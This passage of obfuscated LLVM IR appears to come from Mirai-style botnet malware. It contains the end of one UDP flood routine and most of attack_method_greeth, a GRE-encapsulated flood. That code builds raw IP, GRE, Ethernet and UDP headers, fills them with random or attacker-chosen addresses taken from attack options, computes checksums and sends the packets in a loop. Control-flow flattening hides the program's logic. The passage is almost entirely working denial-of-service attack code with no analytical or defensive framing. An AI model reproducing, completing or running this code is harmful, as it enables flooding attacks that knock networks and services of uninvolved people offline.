  %342 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 0
  store i16 %341, i16* %343, align 2
  store i32 355046766, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i16, i16* %17, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  %348 = select i1 %347, i32 1746548167, i32 -118164344
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @rand_next()
  %351 = and i32 %350, 65535
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 1
  store i16 %352, i16* %354, align 2
  store i32 -118164344, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8, i8* %20, align 1
  %357 = icmp ne i8 %356, 0
  %358 = select i1 %357, i32 -1636870010, i32 -1263108998
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = call i32 @rand_next()
  %361 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 9
  store i32 %360, i32* %362, align 4
  store i32 1330555931, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 9
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 9
  store i32 %366, i32* %368, align 4
  store i32 1330555931, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* %19, align 1
  %371 = icmp ne i8 %370, 0
  %372 = select i1 %371, i32 1716351963, i32 202755633
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %31, align 8
  %375 = load i32, i32* %18, align 4
  call void @rand_str(i8* %374, i32 %375)
  store i32 202755633, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 7
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = bitcast %struct.iphdr* %379 to i16*
  %381 = call zeroext i16 @checksum_generic(i16* %380, i32 20)
  %382 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 7
  store i16 0, i16* %385, align 2
  %386 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %387 = bitcast %struct.iphdr* %386 to i16*
  %388 = call zeroext i16 @checksum_generic(i16* %387, i32 20)
  %389 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 %388, i16* %390, align 2
  %391 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %392 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %391, i32 0, i32 3
  store i16 0, i16* %392, align 2
  %393 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %394 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %395 = bitcast %struct.udphdr* %394 to i8*
  %396 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 2
  %398 = load i16, i16* %397, align 2
  %399 = load i32, i32* %18, align 4
  %400 = sext i32 %399 to i64
  %401 = add i64 8, %400
  %402 = trunc i64 %401 to i32
  %403 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %393, i8* %395, i16 zeroext %398, i32 %402)
  %404 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 2
  %406 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 0
  store i16 2, i16* %411, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 9
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 2
  %421 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %420, i32 0, i32 0
  store i32 %414, i32* %421, align 4
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 0
  %427 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %426, i32 0, i32 1
  store i16 0, i16* %427, align 2
  %428 = load i32, i32* %10, align 4
  %429 = load i8*, i8** %26, align 8
  %430 = load i32, i32* %18, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 52, %431
  %433 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %434 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %435 = load i32, i32* %9, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = bitcast %struct.sockaddr_in* %438 to %struct.sockaddr*
  store %struct.sockaddr* %439, %struct.sockaddr** %433, align 8
  %440 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %441 = load %struct.sockaddr*, %struct.sockaddr** %440, align 8
  %442 = call i64 @sendto(i32 %428, i8* %429, i64 %432, i32 16384, %struct.sockaddr* %441, i32 16)
  store i32 -693019687, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %9, align 4
  %445 = add nsw i32 %444, 1
  store i32 %445, i32* %9, align 4
  store i32 467811984, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  store i32 944966294, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %446, %443, %376, %373, %369, %363, %359, %355, %349, %344, %338, %333, %318, %313, %309, %305, %284, %255, %249, %248, %247, %244, %228, %220, %214, %205, %201, %151, %147, %96, %90, %89, %86, %80, %79, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 1458)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1590220498, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1590220498, label %first
    i32 2018266689, label %87
    i32 1595410644, label %88
    i32 745897315, label %94
    i32 377159713, label %97
    i32 818169246, label %98
    i32 -541967017, label %104
    i32 -1362287284, label %158
    i32 1215490510, label %162
    i32 1222156133, label %215
    i32 726511575, label %219
    i32 744213158, label %228
    i32 1857484939, label %234
    i32 1972988062, label %242
    i32 -956481068, label %258
    i32 1323511971, label %261
    i32 -1122231961, label %262
    i32 763549504, label %263
    i32 854888898, label %269
    i32 -810823904, label %301
    i32 -2139727461, label %322
    i32 1430814376, label %326
    i32 -1068361147, label %330
    i32 876402025, label %335
    i32 850944466, label %350
    i32 1842089984, label %355
    i32 -1443377919, label %361
    i32 1486185571, label %366
    i32 -633325682, label %372
    i32 -1420776430, label %376
    i32 -1203727895, label %380
    i32 175383597, label %386
    i32 1571560148, label %412
    i32 1193115656, label %415
    i32 1687693672, label %482
    i32 364790531, label %485
    i32 -578646898, label %486
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %85 = icmp eq i32 %.reload, -1
  %86 = select i1 %85, i32 2018266689, i32 1595410644
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -578646898, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %89 = load i32, i32* %10, align 4
  %90 = bitcast i32* %9 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  %93 = select i1 %92, i32 745897315, i32 377159713
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %10, align 4
  %96 = call i32 @close(i32 %95)
  store i32 -578646898, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 818169246, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %9, align 4
  %100 = load i8, i8* %5, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %99, %101
  %103 = select i1 %102, i32 -541967017, i32 1323511971
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %106 = load i8**, i8*** %11, align 8
  %107 = load i32, i32* %9, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %11, align 8
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %22, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %23, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.ethhdr*
  store %struct.ethhdr* %121, %struct.ethhdr** %24, align 8
  %122 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %123 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %122, i64 1
  %124 = bitcast %struct.ethhdr* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %26, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, 15
  %132 = or i8 %131, 64
  store i8 %132, i8* %129, align 4
  %133 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, -16
  %137 = or i8 %136, 5
  store i8 %137, i8* %134, align 4
  %138 = load i8, i8* %12, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 1
  store i8 %138, i8* %140, align 1
  %141 = load i32, i32* %18, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 66, %142
  %144 = trunc i64 %143 to i16
  %145 = call zeroext i16 @htons(i16 zeroext %144) #7
  %146 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i32 0, i32 2
  store i16 %145, i16* %147, align 2
  %148 = load i16, i16* %13, align 2
  %149 = call zeroext i16 @htons(i16 zeroext %148) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 3
  store i16 %149, i16* %151, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 5
  store i8 %152, i8* %154, align 4
  %155 = load i8, i8* %15, align 1
  %156 = icmp ne i8 %155, 0
  %157 = select i1 %156, i32 -1362287284, i32 1215490510
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 4
  store i16 %159, i16* %161, align 2
  store i32 1215490510, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 6
  store i8 47, i8* %164, align 1
  %165 = load i32, i32* %21, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 8
  store i32 %165, i32* %167, align 4
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 9
  store i32 %173, i32* %175, align 4
  %176 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %177 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %178 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %177, i32 0, i32 1
  store i16 %176, i16* %178, align 2
  %179 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %180 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %181 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %180, i32 0, i32 2
  store i16 %179, i16* %181, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, 15
  %186 = or i8 %185, 64
  store i8 %186, i8* %183, align 4
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = bitcast %struct.iphdr* %187 to i8*
  %189 = load i8, i8* %188, align 4
  %190 = and i8 %189, -16
  %191 = or i8 %190, 5
  store i8 %191, i8* %188, align 4
  %192 = load i8, i8* %12, align 1
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 1
  store i8 %192, i8* %194, align 1
  %195 = load i32, i32* %18, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 28, %196
  %198 = trunc i64 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %13, align 2
  %203 = zext i16 %202 to i32
  %204 = xor i32 %203, -1
  %205 = trunc i32 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 3
  store i16 %206, i16* %208, align 4
  %209 = load i8, i8* %14, align 1
  %210 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 5
  store i8 %209, i8* %211, align 4
  %212 = load i8, i8* %15, align 1
  %213 = icmp ne i8 %212, 0
  %214 = select i1 %213, i32 1222156133, i32 726511575
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 4
  store i16 %216, i16* %218, align 2
  store i32 726511575, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 6
  store i8 17, i8* %221, align 1
  %222 = call i32 @rand_next()
  %223 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  store i32 %222, i32* %224, align 4
  %225 = load i8, i8* %20, align 1
  %226 = icmp ne i8 %225, 0
  %227 = select i1 %226, i32 744213158, i32 1857484939
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 9
  %231 = load i32, i32* %230, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  store i32 1972988062, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 8
  %237 = load i32, i32* %236, align 4
  %238 = sub i32 %237, 1024
  %239 = xor i32 %238, -1
  %240 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  store i32 1972988062, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i16, i16* %16, align 2
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  store i16 %244, i16* %246, align 2
  %247 = load i16, i16* %17, align 2
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 1
  store i16 %248, i16* %250, align 2
  %251 = load i32, i32* %18, align 4
  %252 = sext i32 %251 to i64
  %253 = add i64 8, %252
  %254 = trunc i64 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 2
  store i16 %255, i16* %257, align 2
  store i32 -956481068, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %9, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  store i32 818169246, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 -1122231961, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 763549504, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %9, align 4
  %265 = load i8, i8* %5, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %264, %266
  %268 = select i1 %267, i32 854888898, i32 364790531
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8**, i8*** %11, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8*, i8** %270, i64 %272
  %274 = load i8*, i8** %273, align 8
  store i8* %274, i8** %30, align 8
  %275 = load i8*, i8** %30, align 8
  %276 = bitcast i8* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %31, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.grehdr*
  store %struct.grehdr* %279, %struct.grehdr** %32, align 8
  %280 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %281 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %280, i64 1
  %282 = bitcast %struct.grehdr* %281 to %struct.ethhdr*
  store %struct.ethhdr* %282, %struct.ethhdr** %33, align 8
  %283 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %284 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %283, i64 1
  %285 = bitcast %struct.ethhdr* %284 to %struct.iphdr*
  store %struct.iphdr* %285, %struct.iphdr** %34, align 8
  %286 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i64 1
  %288 = bitcast %struct.iphdr* %287 to %struct.udphdr*
  store %struct.udphdr* %288, %struct.udphdr** %35, align 8
  %289 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i64 1
  %291 = bitcast %struct.udphdr* %290 to i8*
  store i8* %291, i8** %36, align 8
  %292 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 2
  %297 = load i8, i8* %296, align 4
  %298 = zext i8 %297 to i32
  %299 = icmp slt i32 %298, 32
  %300 = select i1 %299, i32 -810823904, i32 -2139727461
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %31, align 8
